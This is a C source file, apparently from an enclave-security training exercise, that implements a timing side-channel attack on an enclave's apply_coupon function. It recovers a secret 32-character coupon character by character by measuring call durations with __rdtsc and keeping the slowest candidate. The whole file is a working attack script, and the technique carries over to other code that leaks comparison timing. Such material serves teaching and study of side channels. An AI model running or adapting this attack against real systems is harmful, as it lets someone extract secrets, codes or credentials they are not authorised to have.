
#include "stdafx.h"
#include "exploits.h"
#include "common_enclave_actions.h"


void e1_timing_attack(char* server_ip, int iport, char* library_folder)
{
	// create an enclave

	// do apply coupon with time measurement for each byte until first 32 byte coupon is recovered
	// the rest of coupons left as an excersise to the practitioner

	if (!load_enclave())
	{
		printf("\n Can not create enclave for timing attack ...");
		return;
	}
	if (!init_enclave(server_ip, library_folder, iport))
	{
		printf("\n Can not initialize enclave for timing attack ...");
		return;
	}
	// 
	char *alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
	char coupon[33] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
	bool res = false;
	int syms_in_alphabet = (int)strlen(alphabet);
	uint64_t time_diffs[256];// = (uint64_t*)malloc(sizeof(uint64_t)*syms_in_alphabet);
	int i, j, try_count = 30*1024;
	int wrptr = 0;
	do
	{
		memset(time_diffs, 0, sizeof(uint64_t)*256);
		for (i = 0; i < syms_in_alphabet; i++)
		{
			coupon[wrptr] = alphabet[i];
			for (j = 0; j < try_count; j++)
			{
				uint64_t start, end;
				start = __rdtsc();
				res = apply_coupon(coupon);
				end = __rdtsc();
				if (res)
				{
					printf("\nRecovered coupon: %s", coupon);
					return;
				}
				time_diffs[i] += (uint64_t)(end - start);
			}
		}
		uint64_t max_diff = 0;
		int recovered_index = 0;
		for (j = 0; j < syms_in_alphabet; j++)
		{
			if (time_diffs[j] > max_diff)
			{
				max_diff = time_diffs[j];
				recovered_index = j;
			}
		}
		coupon[wrptr] = alphabet[recovered_index];
		wrptr++;
	} while (!res && wrptr < 32);

	if (!res || wrptr >= 32)
	{
		printf("\n timing attack failure, try again ");
	}

}
